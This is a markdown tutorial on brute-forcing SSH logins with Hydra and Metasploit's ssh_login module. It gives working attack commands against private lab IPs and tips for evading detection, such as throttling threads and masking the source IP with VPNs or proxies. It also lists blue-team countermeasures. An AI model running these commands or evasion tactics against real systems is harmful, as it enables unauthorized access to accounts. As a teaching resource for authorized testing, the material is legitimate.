# Bruteforce Attacks Guide

## 🔹 Introduction
Bruteforce attacks involve systematically trying multiple usernames and passwords to gain access to a target system. This technique is useful for **testing password strength**, **identifying weak/default credentials**, and **evaluating blue team detection capabilities**.

⚠️ **Warning:** Bruteforce attacks against SSH are **loud** and can be easily detected by defensive teams.

---

## 🔹 Bruteforcing SSH with Hydra
Hydra is a **fast and flexible password brute-force tool** that supports multiple protocols, including SSH.

### **Basic SSH Bruteforce Attack**
```bash
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.13.143:22 -t 4 -V
```

### **Breakdown of the Command:**
- **`hydra`** → Launches the Hydra tool.
- **`-l root`** → Specifies the username (lowercase `-l` means single user).
- **`-P /usr/share/wordlists/metasploit/unix_passwords.txt`** → Uses a wordlist to try multiple passwords.
- **`ssh://192.168.13.143:22`** → Defines the target SSH service and port.
- **`-t 4`** → Uses **4 parallel attack threads** (lower numbers = stealthier, higher = noisier but faster).
- **`-V`** → Enables verbose mode (shows each attempt in real time).

### **User Bruteforcing**
If we want to test **multiple usernames**, we use an uppercase `-L`:
```bash
hydra -L users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.13.143:22 -t 4 -V
```
- **`-L users.txt`** → Uses a **list of usernames** instead of a single one.

---

## 🔹 Bruteforcing SSH with Metasploit
Metasploit has a built-in SSH brute-force module for automated attacks.

### **1️⃣ Launch MSFConsole**
```bash
msfconsole
```

### **2️⃣ Find the SSH Bruteforce Module**
```bash
search ssh
```
Look for:
```bash
auxiliary/scanner/ssh/ssh_login
```

### **3️⃣ Load the SSH Login Module**
```bash
use auxiliary/scanner/ssh/ssh_login
```

### **4️⃣ Set Required Options**
```bash
options
set username root
set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
set rhosts 192.168.57.137
```
- **`set username root`** → Specifies the user.
- **`set pass_file`** → Defines the password wordlist.
- **`set rhosts`** → Specifies the target IP.

### **5️⃣ Adjust Settings for Speed & Visibility**
```bash
set threads 10
```
- **Low threads (1-5)** → **Stealthy but slow**.
- **Medium threads (5-10)** → **Balanced attack speed**.
- **High threads (10-20)** → **Fast but easily detected**.

```bash
set verbose true
```
- **Shows real-time progress** in the terminal.

### **6️⃣ Run the Attack**
```bash
run
```
Metasploit will start attempting logins. If successful, it will display **valid credentials**.

---

## 🔹 Additional Considerations
### **Detection & Evasion Tips:**
- **Reduce threads (`-t 1` or `-t 2`)** to slow down attacks and avoid detection.
- **Use VPNs or proxies** to mask your IP.
- **Try different ports** (if SSH is running on a non-standard port, e.g., `2222`).
- **Monitor logs (`/var/log/auth.log`)** to see how attacks are logged.

### **Blue Team Countermeasures:**
- **Fail2Ban**: Blocks IPs after multiple failed login attempts.
- **SSH Key Authentication**: Disables password-based logins.
- **Rate Limiting**: Restricts SSH login attempts.
- **Moving SSH to a non-standard port** (e.g., `2222`) reduces automated attacks.

---

## 🔹 Conclusion
Bruteforce attacks are **noisy** and should only be used for **testing password security** in ethical hacking engagements. By leveraging **Hydra and Metasploit**, security professionals can assess the **strength of credentials** and identify **vulnerable SSH services**.